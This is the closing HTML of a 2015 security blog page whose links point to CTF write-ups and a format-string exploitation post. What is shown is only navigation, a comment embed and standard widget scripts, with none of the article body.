  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/" title="Previous Post: Solving the x86-64 Shellcoding Challenges of RingZer0CTF">&laquo; Solving the x86-64 Shellcoding Challenges of RingZer0CTF</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/" title="Next Post: BSides Vancouver CTF - Sushi">BSides Vancouver CTF - Sushi &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/03/30/0ctf-flagen/">0ctf - Flagen</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/">After the Fact - BCTF Zhong Guan Cun Writeup</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/18/bsides-vancouver-ctf-www/">BSides Vancouver CTF - WWW</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/">BSides Vancouver CTF - Sushi</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/">Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/';
        var disqus_url = 'http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
